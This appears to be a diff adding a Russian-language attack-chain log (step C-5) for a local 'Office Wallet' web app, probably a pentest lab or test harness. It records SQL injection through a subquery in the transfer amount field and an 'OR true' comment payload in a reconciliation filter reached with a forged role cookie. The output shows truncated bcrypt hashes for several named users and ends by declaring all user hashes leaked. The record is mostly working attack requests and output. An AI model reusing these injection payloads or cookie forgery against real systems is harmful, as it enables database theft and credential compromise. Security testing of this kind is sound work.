@@ -1,0 +1,26 @@
+OFFICE WALLET · ЦЕПОЧКА АТАКИ
+################################################################################################
+# Ц-5
+################################################################################################
+== Ц-5 · SQL-инъекция → дамп bcrypt-хешей всех пользователей ==
+    · Error-based чтение в сумме перевода (OW-14) доступно любой учётке;
+    · второй, независимый канал — фильтр бухгалтерской сверки (OW-21), роль
+    · для которого подделываем кукой. Оба читают базу как есть.
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → POST /transfer/new  amount_rub=(SELECT string_agg(login…))
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Перевод · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → SQL SELECT role FROM users WHERE login='ivanov'
+    ← psql admin
+    → POST /accounting/reconcile  (контроль без инъекции)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Сверка · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">  ...
+    → POST /accounting/reconcile  (OR true + SQL-комментарий)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Сверка · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">  ...
+    ┌─ АРТЕФАКТ · Ц-5 · два независимых канала чтения базы
+    │ transfer/new с подзапросом → хешей в ответе: 6
+    │   "kassa=$2a$10$Zssjo8K34d6BwzSaBwQ/IuwnAxvmun…
+    │   buch=$2a$10$k2hQU0/WUG56ehd238qLE.vYvd8aynYm…
+    │   sidorov=$2a$10$m.GFGJUh6MIMPjuXqqUG6OlDSVgLY…
+    │ сверка: контроль «ow_chain_no_such_7f91» → строк 2; payload OR true → строк 404
+    └─
+[+] хеши всех пользователей слиты, фильтр сверки развернут
